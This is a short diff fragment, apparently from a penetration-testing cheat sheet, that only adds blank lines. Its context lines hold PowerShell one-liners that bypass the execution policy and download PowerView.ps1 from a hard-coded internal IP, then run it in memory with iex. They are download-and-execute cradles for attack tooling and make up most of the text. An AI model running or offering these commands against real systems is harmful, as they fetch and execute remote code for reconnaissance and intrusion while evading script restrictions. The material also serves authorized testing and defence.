@@ -22,3 +22,5 @@ powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.Cr
 # Non-proxy aware
 $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
 ```
+
+
